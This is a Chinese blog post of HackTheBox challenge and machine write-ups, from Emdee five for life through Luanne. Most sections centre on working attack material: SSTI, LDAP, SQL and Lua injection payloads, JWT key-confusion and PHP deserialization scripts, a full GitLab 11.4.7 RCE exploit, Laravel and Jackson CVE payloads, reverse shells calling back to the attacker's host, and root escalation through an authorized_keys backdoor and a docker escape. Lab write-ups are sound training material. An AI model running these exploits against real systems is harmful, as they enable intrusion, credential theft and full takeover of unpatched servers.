title: HackTheBox做题记录
author: bmth
tags:
  - HackTheBox
img: 'https://img-blog.csdnimg.cn/20210306104757724.png'
categories: []
date: 2020-12-31 18:06:00
---
参考的安装教程：[hackthebox 入门攻略 ](https://www.sohu.com/a/288310203_120055360)
下载openvpn配置文件：[https://www.hackthebox.eu/home/htb/access/ovpnfile](https://www.hackthebox.eu/home/htb/access/ovpnfile)
![](https://img-blog.csdnimg.cn/20201227164930158.png)
`sudo openvpn --config xxxx.ovpn`即可

## Challenges
### Emdee five for life
首先访问发现要md5加密这一字符串，发现有时间限制，不能太慢
![](https://img-blog.csdnimg.cn/20210103173911146.png)
运行python脚本即可：
```python
import requests
import re
from hashlib import md5
s = requests.Session()
a = s.get('http://206.189.17.51:30630/')
b = re.findall(r'<h3 align=\'center\'>(.*?)</h3>',a.text)[0]

def encrypt_md5(msg):
    new_md5 = md5()
    new_md5.update(msg.encode(encoding='utf-8'))
    return new_md5.hexdigest()

c= encrypt_md5(b)
d={
    "hash":c
}
r = s.post("http://206.189.17.51:30630/",data=d)
print(r.text)
```
![](https://img-blog.csdnimg.cn/20210103174256333.png)
### Templated
进入发现是Flask/Jinja2
![](https://img-blog.csdnimg.cn/20210103174831599.png)
是SSTI，直接上payload：
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag.txt').read()") }}{% endif %}{% endfor %}
```
![](https://img-blog.csdnimg.cn/20210103175037651.png)
### FreeLancer
查看源码得到了提示
![](https://img-blog.csdnimg.cn/20210103184303535.png)
进入发现是一个sql注入
![](https://img-blog.csdnimg.cn/20210103184507300.png)
直接使用sqlmap一把梭，
```bash
python3 sqlmap.py -u http://178.128.40.63:30991/portfolio.php?id=1 --batch
python3 sqlmap.py -u http://178.128.40.63:30991/portfolio.php?id=1 -D freelancer -T safeadmin --dump --batch
```
![](https://img-blog.csdnimg.cn/20210103185842796.png)
并没有发现flag，但发现可以读文件，扫描目录发现存在`administrat/panel.php`，猜测路径为/var/www/html/，直接`python3 sqlmap.py -u http://178.128.40.63:30991/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php`，得到flag
![](https://img-blog.csdnimg.cn/20210103191548363.png)
### Phonebook
发现是一个登录题，并且弱密码无效，进过多次尝试发现`admin:*`，`password:*`即可登录成功
![](https://img-blog.csdnimg.cn/20210206151845804.png)
但发现什么都没有，猜测是要读取账号密码，这里发现是Ldap注入，写一个小脚本爆破密码得到flag
```python
import requests

flag=''
dic = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ1234567890{}_'


for s in range(50):
    for i in dic:
        password = flag+i
        data={'username':'*','password':password+'*'}

        a = requests.post(url="http://134.209.16.184:32507/login",data=data)
        if 'success' in a.text:
            flag=flag+i
            print(flag)
            break
```
![](https://img-blog.csdnimg.cn/20210206151450987.png)
可参考文章：
[从一次漏洞挖掘入门Ldap注入](https://xz.aliyun.com/t/5689)
[浅谈LDAP注入攻击](https://www.anquanke.com/post/id/212186)

### Under Construction
首先注册登录，但发现进去之后啥都没有，查看请求包发现session特别长
![](https://img-blog.csdnimg.cn/20210427233818248.png)
并发现这正是jwt，到[https://jwt.io/](https://jwt.io/)去看看
![](https://img-blog.csdnimg.cn/20210427233136823.png)
payload里面存在username，还有个公钥，并使用的是RS256算法，给出了源码，在`routes/index.js`中发现
```js
let user = await DBHelper.getUser(req.data.username);
```
在`/helpers/DBHelper.js`文件中查看此函数的详细信息
![](https://img-blog.csdnimg.cn/20210207213738382.png)
由于在解密的过程中，同时支持了两种算法 `RSA256/HS256`，如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名
写脚本利用公钥作为密钥进行HS256加密
```python
# coding: utf-8
import jwt
import requests


def gen_token(username):
    payload = {"username": username,
               "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
               "iat": 1619536862}
    public = payload.get("pk")
    return jwt.encode(payload, public, algorithm="HS256")


def req_host(token):
    url = "http://206.189.121.131:30268/"
    headers = {
        "cookie": "session=" + token
    }
    r = requests.get(url, headers=headers)
    print(r.text)


def injection(payload):
    token = gen_token(payload)
    req_host(token)


if __name__ == '__main__':
    p = "root' UNION SELECT NULL,top_secret_flaag,NULL from flag_storage--"
    injection(p)
```
运行的时候发现被禁止使用公钥来加密，直接注释掉即可
![](https://img-blog.csdnimg.cn/20210427234006525.png)![](https://img-blog.csdnimg.cn/20210428000609726.png)
参考：
[Hacking JWT(JSON Web Token)](https://www.cnblogs.com/dliv3/p/7450057.html)
[HACK TEH BOX - Under Construction（JWT密钥混淆 + SQL注入）](https://www.cnblogs.com/snowie/p/14689894.html)
[Hack the Box——Under Construction](https://blog.ncu204.com/post/hack_the_box/under-construction/)

### Toxic
比较简单的题目，给出了源码
index.php：
```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```
PageModel.php：
```php
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```
发现会反序列化`$cookie`，而这个数据我们可控，即可包含任意文件
payload：
```php
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
$page = new PageModel;
$page->file = '/etc/passwd';
echo base64_encode(serialize($page));
echo("\n");
```
得到`Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30=`，包含成功
![](https://img-blog.csdnimg.cn/20210502221400147.png)

但发现我们包含不了flag，查看发现flag文件名被随机生成了，那么只能另找办法
![](https://img-blog.csdnimg.cn/20210502221515973.png)
通过nginx配置文件`/etc/nginx/nginx.conf`，发现我们可以获取日志文件`/var/log/nginx/access.log`
![](https://img-blog.csdnimg.cn/20210502221747900.png)
日志文件写shell，懂得都懂，将一句话写入UA头即可
![](https://img-blog.csdnimg.cn/20210502222600594.png)
接下来读取即可得到flag了

## Machines
### Doctor
首先nmap扫描`nmap -A -sS -sV -v -p- 10.10.10.209`
![](https://img-blog.csdnimg.cn/20201227182217477.png)访问一下ip地址发现没什么思路，扫描目录也没找到什么东西，看到一个提示
![](https://img-blog.csdnimg.cn/20201227182328190.png)那么我们更改一下`/etc/hosts`，访问doctors.htb
![](https://img-blog.csdnimg.cn/20201227182619632.png)
发现是一个登录界面，首先注册一个账号登录，很明显使用了curl，这里猜测是使用了`os.system('curl')`，在New Message可以获取shell
`<img src=http://10.10.14.29/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.29'$IFS'6666')>`
![](https://img-blog.csdnimg.cn/2020122718433067.png)`python3 -c "import pty;pty.spawn('/bin/bash')"`，之后进入home目录，发现一个用户shaun
![](https://img-blog.csdnimg.cn/20201227184727998.png)
之后进入到`cd /var/log/apache2`目录去找记录，发现有一个backup，cat一下，正则匹配一下`grep -r password?email`
![](https://img-blog.csdnimg.cn/20201227185226321.png)获得密码Guitar123，即可登录用户shaun，即可获取第一个flag
![](https://img-blog.csdnimg.cn/20201227185554524.png)
但发现`sudo -l`执行失败，发现了8089端口还没有用，是splunk
`splunk privilege escalation`脚本：[https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
下载下来脚本，首先赋予权限：`chmod +x PySplunkWhisperer2_remote.py`
```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.29 --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.14.29' '1234''
```

![](https://img-blog.csdnimg.cn/20201227191726173.png)
 参考：[HackTheBox Doctor | Walkthrough](https://www.youtube.com/watch?v=yTpua0ysRWM)

### Academy
首先需要修改hosts
![](https://img-blog.csdnimg.cn/20210102192140643.png)
`python3 dirsearch.py -u http://academy.htb/ -e php`扫描目录发现存在admin.php
![](https://img-blog.csdnimg.cn/20210102194712748.png)
随后注册账号时进行抓包，发现我kali里面的bp打不开了，发现java和javac版本不一样，使用`update-alternatives --config java`更改版本即可，将roleid=0改为roleid=1，admin.php处登录成功
![](https://img-blog.csdnimg.cn/20210102200125539.png)
发现一个域名dev-staging-01.academy.htb添加hosts并访问，获得一个错误页面，并没有什么卵用
![](https://img-blog.csdnimg.cn/20210102200749431.png)
最后发现是CVE-2018-15133，[Laravel框架RCE分析（CVE-2018-15133）](https://xz.aliyun.com/t/6533)，可通过页面泄漏的APP_KEY获取WebShell，可以利用[https://github.com/kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)生成Payload
![](https://img-blog.csdnimg.cn/20210102204710926.png)
刷新页面并拦截数据包，修改HTTP请求方法为POST，添加Payload，发送之后成功返回`uname -a`命令的执行结果
![](https://img-blog.csdnimg.cn/20210102204944529.png)
```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.78/6666 0>&1' | base64
./phpggc Laravel/RCE1 'system' 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC82NjY2IDA+JjE= | base64 -d | /bin/bash' -b
```
![](https://img-blog.csdnimg.cn/20210102205835234.png)
```bash
php cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg1OiJlY2hvIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNDNPQzgyTmpZMklEQStKakU9IHwgYmFzZTY0IC1kIHwgL2Jpbi9iYXNoIjt9
```
![](https://img-blog.csdnimg.cn/20210102205917469.png)
也可以直接使用[https://github.com/aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)，更加简单粗暴
`APP_KEY：base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=`
![](https://img-blog.csdnimg.cn/20210102202717332.png)
查看/etc/passwd，发现存在普通用户：21y4d，ch4p，cry0l1t3，egre55，g0blin，mrb3n
![](https://img-blog.csdnimg.cn/20210102210211784.png)
在/home/cry0l1t3目录下发现user.txt文件
![](https://img-blog.csdnimg.cn/20210102230831187.png)
说明我们需要登录cry0l1t3用户，接着在/var/www/html/academy/.env文件中发现MySQL数据库dev用户的密码：mySup3rP4s5w0rd!!
![](https://img-blog.csdnimg.cn/20210102231344782.png)
将以上6个普通用户和root添加到user.txt，使用该密码进行枚举
`hydra -L user.txt -p 'mySup3rP4s5w0rd!!' 10.10.10.215 ssh`
![](https://img-blog.csdnimg.cn/20210102231803659.png)
使用该密码登录cry0l1t3用户，得到第一个flag。
![](https://img-blog.csdnimg.cn/20210102232634224.png)
查看各用户信息发现cry0l1t3和egre55用户在都在adm用户组，且egre55用户在多个用户组中，使用`find / -group adm -type f 2>/dev/null`命令查看所有adm组的文件
![](https://img-blog.csdnimg.cn/20210102232844793.png)
这里发现需要使用提权辅助脚本：[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
```bash
python -m SimpleHTTPServer 80
wget 10.10.14.78/linpeas.sh
sh linpeas.sh
```
发现mrb3n用户的密码：mrb3n_Ac@d3my!
![](https://img-blog.csdnimg.cn/20210102235619287.png)
登录之后发现`/usr/bin/composer`文件具有sudo权限，直接[https://gtfobins.github.io/gtfobins/composer/](https://gtfobins.github.io/gtfobins/composer/)
```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```
![](https://img-blog.csdnimg.cn/20210103000224325.png)
得到root权限

参考：[Hack The Box——Academy](https://blog.csdn.net/qq_32261191/article/details/110298636)

### Passage
我们将机器的IP地址添加到我们的`/etc/hosts`文件中
`echo "10.10.10.206  passage.htb" >> /etc/hosts`
扫描端口发现只开放了两个端口：`nmap -A -sS -sV -v 10.10.10.206`
![](https://img-blog.csdnimg.cn/20210125165124170.png)
由于请求过多，该站点已实施**Fail2ban**禁令2分钟，因此，我们无法在网站上模糊测试，但发现该站点由PHP新闻管理系统**CuteNews**驱动
![](https://img-blog.csdnimg.cn/20210125165221319.png)
在`http://passage.htb/CuteNews/`上找到CuteNews CMS的登录页面，并发现版本为2.1.2，使用searchsploit寻找CuteNews版本的一些漏洞
![](https://img-blog.csdnimg.cn/20210125165444492.png)
`searchsploit cutenews`，找到了合适的版本`php/remote/46698.rb`
![](https://img-blog.csdnimg.cn/20210125165740857.png)
先复制文件到`/usr/share/metasploit-framework/modules/exploits`
随后注册一个普通账号，我这里是用户名为1，密码为123456，运行脚本
```bash
use 46698.rb
show options
set USERNAME 1
set PASSWORD 123456
set RHOSTS 10.10.10.206
set lhost 10.10.14.60
run
```
![](https://img-blog.csdnimg.cn/20210125180609241.png)
获取交互式shell：`python -c "import pty;pty.spawn('/bin/bash')"`，并查看/home文件夹下的用户，得到nadav和paul这两个用户
![](https://img-blog.csdnimg.cn/20210125181835315.png)
在`/var/www/html/CuteNews/cdata/users`目录下发现users.txt，并且查看lines发现存在base64加密的内容，尝试解码，得到paul和nadav加密过的密码
![](https://img-blog.csdnimg.cn/20210125182046437.png)
使用[https://www.chinabaiker.com/cyberchef.htm](https://www.chinabaiker.com/cyberchef.htm)分析哈希，发现哈希可能使用SHA-256
使用hashcat破解哈希：
```cmd
hashcat64.exe -m 1400 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd ./字典文件/rockyou.txt --force
```
![](https://img-blog.csdnimg.cn/20210125191033993.png)
破解得到密码`atlanta1`，登录：`su paul`，即可获取user.txt
我们在.ssh文件夹下的`authorized_keys`中找到用户nadav。因此nadav可以不用密码即可进入用户paul，那么尝试`ssh nadav@passage.htb`，发现成功切换用户
![](https://img-blog.csdnimg.cn/20210125191627104.png)
`ps -auxwww`查看系统上正在运行的进程，发现
```
root       2858  0.0  0.4 235520 19724 ?        Sl   02:47   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
```
一个名为usb-creator-helper的程序，发现它是由内置的实时USB创建程序用于ubuntu的
提权文章：[https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
使用以下命令从根主目录将root的id_rsa获取到/tmp文件夹:
```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
```
![](https://img-blog.csdnimg.cn/2021012519335992.png)
最后使用id_rsa，以root用户身份进入即可
![](https://img-blog.csdnimg.cn/20210125193730904.png)

参考：
[USBCreator D-Bus接口漏洞分析](https://xz.aliyun.com/t/5683)
[Hackthebox - Passage Writeup](https://fmash16.github.io/content/writeups/hackthebox/htb-Passage.html)

### Delivery
第一步很熟悉了，修改`/etc/hosts`
![](https://img-blog.csdnimg.cn/20210306111040595.png)
随后访问靶机，发现是osTicket，我们首先Open a New Ticket，随便填入一些内容
![](https://img-blog.csdnimg.cn/20210306111311444.png)即可得到
![](https://img-blog.csdnimg.cn/20210306111526163.png)
```
id: 6363778
email: 6363778@delivery.htb
```
随后进入Check Ticket Status，输入我们填的email和得到的id，成功返回页面
![](https://img-blog.csdnimg.cn/20210306111656773.png)那么就可以返回`10.10.10.222`，点击Contact Us，进入`http://delivery.htb:8065/`，点击Create one now，输入email，填写账号密码，那么即可得到一个链接
![](https://img-blog.csdnimg.cn/20210306112540400.png)登录即可，得到root的提示：`maildeliverer:Youve_G0t_Mail!`
![](https://img-blog.csdnimg.cn/20210306113013485.png)那么使用ssh登录上去得到user权限
`ssh -o StrictHostKeyChecking=no maildeliverer@delivery.htb`
![](https://img-blog.csdnimg.cn/2021030611381928.png)
我们发现`/opt/mattermost/config`中的config.json存在mysql登录，那么使用mysql连接数据库
![](https://img-blog.csdnimg.cn/20210306114420890.png)
```sql
mysql -u mmuser -pCrack_The_MM_Admin_PW -h 127.0.0.1 -P 3306 -D mattermost
select Username,Password,Email from Users;
```
![](https://img-blog.csdnimg.cn/20210306114953177.png)得到root密码：`$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO`，hashid分析
![](https://img-blog.csdnimg.cn/20210306122437774.png)
那么使用bcrypt哈希模式，为模式3200，由于root之前已经说了要用hashcat中的rules，这里使用`best64.rule`，给出了密码提示：`PleaseSubscribe!`，首先使用规则创建字典
```cmd
hashcat64 -r ./rules/best64.rule --stdout wordlist.txt > password.txt
hashcat64 -a 0 -m 3200 hash.txt password.txt --show
```
![](https://img-blog.csdnimg.cn/20210306125951918.png)
得到密码`PleaseSubscribe!21`，那么登录root账户得到flag
![](https://img-blog.csdnimg.cn/20210306130236861.png)
参考：
[HTB: Delivery [Machine]](https://drt.sh/posts/htb-delivery)
[HackTheBox WriteUp: Delivery](https://dylanpoelstra.nl/delivery.html)

### ScriptKiddie
`nmap --min-rate 10000 -sV -p- 10.10.10.226`
![](https://img-blog.csdnimg.cn/20210309192137393.png)
首先nmap扫描一波，发现开放22和5000端口，发现5000端口运行着Werkzeug，一开始死活进不去，发现是ssl错误，用http，不用https
发现是一个工具箱，使用nmap发现是7.8版本，并未发现漏洞
![](https://img-blog.csdnimg.cn/20210309192632220.png)
在[https://www.exploit-db.com/](https://www.exploit-db.com/)查找venom，发现存在apk模版注入，[https://www.exploit-db.com/exploits/49491](https://www.exploit-db.com/exploits/49491)
![](https://img-blog.csdnimg.cn/2021030919342624.png)查找payload：[https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/)
```
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
show options
set lhost 10.10.14.3
set lport 6666
exploit
```
发现只需要两个参数，监听地址和端口
![](https://img-blog.csdnimg.cn/20210310104802186.png)
最后传入即可得到反弹shell
![](https://img-blog.csdnimg.cn/20210310104708262.png)

最后`nc -lvnp 6666`，进行交互shell：`python3 -c "import pty;pty.spawn('/bin/bash')"`
![](https://img-blog.csdnimg.cn/20210310105435169.png)

发现还存在用户pwn，查看pwn目录下的文件，发现scanlosers.sh会一直扫描`/home/kid/logs/hackers`文件中的ip
![](https://img-blog.csdnimg.cn/20210310110037959.png)
写入代码：(注意那两个空格)，nc监听端口即可
```bash
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1' #" >> hackers
```
![](https://img-blog.csdnimg.cn/20210310120711579.png)
`sudo -l`发现msf的权限为root，那么直接使用msf就可以得到shell了
![](https://img-blog.csdnimg.cn/20210310114511346.png)
直接`sudo /opt/metasploit-framework-6.0.9/msfconsole`
![](https://img-blog.csdnimg.cn/20210310114636984.png)

参考：
[Hack The Box——ScriptKiddie](https://blog.csdn.net/qq_32261191/article/details/113814506)
[Script Kiddie : Hack The Box Walk Through](https://psychovik.medium.com/script-kiddie-hack-the-box-walk-through-7193d5ac6a65)

### Ready
`nmap --min-rate 10000 -sV -p- 10.10.10.220`
首先扫描ip发现开放22和5080端口，是nginx服务器
![](https://img-blog.csdnimg.cn/20210312123506791.png?)
进去发现是GitLab，那么查找相关漏洞，先`/help`查看版本
![](https://img-blog.csdnimg.cn/20210312124328787.png)
查找到相关漏洞：[https://www.exploit-db.com/](https://www.exploit-db.com/)
![](https://img-blog.csdnimg.cn/20210312130634460.png)
[https://www.exploit-db.com/exploits/49257](https://www.exploit-db.com/exploits/49257)，抓包或者查看请求来修改用户名、token等信息(authenticity_token需点击Update profile settings)
![](https://img-blog.csdnimg.cn/20210312133035498.png)poc如下：
```python
# Exploit Title: Gitlab 11.4.7 - Remote Code Execution
# Date: 14-12-2020
# Exploit Author: Fortunato Lodari fox [at] thebrain [dot] net, foxlox
# Vendor Homepage: https://about.gitlab.com/
# POC: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
# Tested On: Debian 10 + Apache/2.4.46 (Debian)
# Version: 11.4.7 community

import sys
import requests
import time
import random
import http.cookiejar
import os.path
from os import path

# Sign in GitLab 11.4.7  portal and get (using Burp or something other):
# authenticity_token
# authenticated cookies
# username
# specify localport and localip for reverse shell

username='aaa'
authenticity_token='/Awx8O2QZbuA2SeGqgJ7kFfuP0m/ImK2O44tl0wPAJLXo67jTgl10XG7DqJVz9iYRmdfz+qIJ55XgpO1n9S6Cg=='
cookie = '_gitlab_session=cb0ef762f383b2b278d5806dec3f26c7; sidebar_collapsed=false'
localport='6666'
localip='10.10.14.13'


url = "http://10.10.10.220:5080"
proxies = { "http": "http://localhost:8080" }


def deb(str):
    print("Debug => "+str)

def create_payload(authenticity_token,prgname,namespace_id,localip,localport,username):
    return {'utf8':'✓','authenticity_token':authenticity_token,'project[ci_cd_only]':'false','project[name]':prgname,'project[namespace_id]':namespace_id,'project[path]':prgname,'project[description]':prgname,'project[visibility_level]':'20','':'project[initialize_with_readme]','project[import_url]':'git://[0:0:0:0:0:ffff:127.0.0.1]:6379/\n multi\n sadd resque:gitlab:queues system_hook_push\n lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\'|nc '+localip+' '+localport+' -e /bin/sh\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"\n exec\n exec\n exec\n/'+username+'/'+prgname+'.git'}

import string
def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for m in range(length))

def init(username,cookie,authenticity_token,localport,localip):
    from bs4 import BeautifulSoup
    import re
    import urllib.parse
    deb("Token: "+authenticity_token)
    deb("Cookie: "+cookie)
    session=requests.Session()
    headers = {'user-agent':'Moana Browser 1.0','Cookie':cookie,'Content-Type':'application/x-www-form-urlencoded','DNT':'1','Upgrade-Insecure-Requests':'1'}
    r=session.get(url+'/projects/new',headers=headers,allow_redirects=True)
    soup = BeautifulSoup(r.content,"lxml")
    nsid = soup.findAll('input', {"id": "project_namespace_id"})
    namespace_id=nsid[0]['value'];
    deb("Namespace ID: "+namespace_id)
    prgname=random_string(8)
    newpayload=create_payload(authenticity_token,prgname,namespace_id,localip,localport,username)
    newpayload=urllib.parse.urlencode(newpayload)
    deb("Payload encoded: "+newpayload)
    r=session.post(url+'/projects',newpayload,headers=headers,allow_redirects=False)
    os.system("nc -nvlp "+localport)

init(username,cookie,authenticity_token,localport,localip)            
```
![](https://img-blog.csdnimg.cn/20210312133756462.png)
`python3 -c "import pty;pty.spawn('/bin/bash')"`，获取交互式shell
直接上传linPEAS提权辅助脚本，发现为Docker
![](https://img-blog.csdnimg.cn/20210312140253188.png)
并发现`smtp_password="wW59U!ZKMbG9+*#h"`
![](https://img-blog.csdnimg.cn/20210312182037991.png)
尝试使用该密码切换至root用户，成功获得root权限shell
![](https://img-blog.csdnimg.cn/20210312182703252.png)
最后发现需要docker逃逸，[技术干货 | Docker 容器逃逸案例汇集](https://www.cnblogs.com/xiaozi/p/13423853.html)
尝试docker 高危启动参数
```bash
fdisk -l  //在容器内，查看磁盘文件
mkdir test  
mount /dev/sda2 test  //将/dev/sda2 挂载到新建目录
```
![](https://img-blog.csdnimg.cn/20210312183650270.png)
最后得到flag：`cat test/root/root.txt`
![](https://img-blog.csdnimg.cn/20210312183811728.png)
也可以获得ssh的密匙：`cat test/root/.ssh/id_rsa`，最后ssh连接即可获取root权限
![](https://img-blog.csdnimg.cn/20210312184006932.png)


参考：[Hack The Box——Ready](https://blog.csdn.net/qq_32261191/article/details/112391350)

### Time
`nmap --min-rate 10000 -A -sV -p- 10.10.10.214`
![](https://img-blog.csdnimg.cn/2021032000301084.png)
发现只开放了80和22端口，在`Validate!(Beta)`随便输入数字+字母发现报错
```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'fasf513asd': was expecting 'null', 'true', 'false' or NaN
```
![](https://img-blog.csdnimg.cn/20210320164225665.png)
这里看wp发现是CVE-2019-12384，看到一篇文章：[CVE-2019-12384漏洞分析及复现](https://www.freebuf.com/vuls/209394.html)，并在github上得到POC：[https://github.com/jas502n/CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384)
先修改ip为kali的ip
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.121/6666 0>&1 &')
```
开启`python -m SimpleHTTPServer 8000`，并发送代码：
```java
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.121:8000/inject.sql'"}]
```
![](https://img-blog.csdnimg.cn/20210320165739648.png)
`nc -lvnp 6666`监听端口，并得到返回的shell
![](https://img-blog.csdnimg.cn/2021032016584871.png)
上传提权脚本linpeas.sh，发现root一直在执行`/usr/bin/timer_backup.sh`，由于存在写入权限，那么将我们的ssh密匙写入即可得到root权限
![](https://img-blog.csdnimg.cn/20210320180010879.png)
首先获取kali的`id_rsa.pub`
![](https://img-blog.csdnimg.cn/20210320181803703.png)
写进`timer_backup.sh`内
```bash
echo "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqf2Zd0fzOtpAic8ftE4kBX63adwahOb5m+asBQh3Qls7DLczLEAYU2eHAlx4DvyO7yL2l+ALAohqpXKPigi1hqIiglzZLP13ZMmrZgm/7zlhPBZXgRD7PkzKBxrWWjyKJOUfv3jzBTvqdui6WJEBxPGovtz3ROscBGBgdrESO60fuEwUNxMp4mEd7+xwl5fpZuuHeGtzjE7f5GF+yvBCwB3vW5uJOX4YVsikcw0Lp3+fFHCDaXYMDy/H7oVkXx/roaZ9ECSaxNmW4tul+skREkeg/J0HHEURCW8SqiNr1mf/r3hNUGlzuOBzM9fq3/SUpLwtWcLq3u0z3u3xiBSAYsgMZ2ITsskUhFsLPA/Yr/OoLNEh+ReIQvNN/TDm68+kvOWiMMWj1v/sqqiOr51aaU156mT3/abOHTgjf808IGp4hr5JLzLEj0Q9ysw1LhxAbDX6p+o2PuZkJKm7xvlIVe+V85TjMfW2A6SunAjR3UggcMXG2OpZHSyVl5HBHSzM= >>/root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```
![](https://img-blog.csdnimg.cn/20210320182802764.png)
`ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no root@10.10.10.214`，最后ssh登录即可获取root权限
![](https://img-blog.csdnimg.cn/20210320182908103.png)

### Luanne
`nmap --min-rate 10000 -A -sV -p- 10.10.10.218`
![](https://img-blog.csdnimg.cn/2021032417493384.png)
发现开启了22、80和9001端口，80端口的robots.txt文件中包含weather目录，并且目标主机运行着NetBSD操作系统
发现80端口和9001端口需要认证，由于存在weather目录，这里看wp发现存在forecast
![](https://img-blog.csdnimg.cn/20210324183802469.png)
并发现很像sql注入，但其实是Lua代码注入：[Lua Web应用程序安全漏洞](https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities)
直接执行命令：`?city=list') os.execute('id')--`
![](https://img-blog.csdnimg.cn/20210324184553531.png)
使用nc反弹shell，记得url编码：
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 6666 >/tmp/f
?city=list%27)%20os.execute(%27rm+%2ftmp%2ff%3bmkfifo+%2ftmp%2ff%3bcat+%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.14.41+6666+%3e%2ftmp%2ff%27)--
```
参考链接：[Linux下NC反弹shell命令（推荐）](https://www.jb51.net/article/118423.htm)
![](https://img-blog.csdnimg.cn/20210324223755479.png)
查看当前文件夹目录发现存在.htpasswd，发现存在webapi_user密码
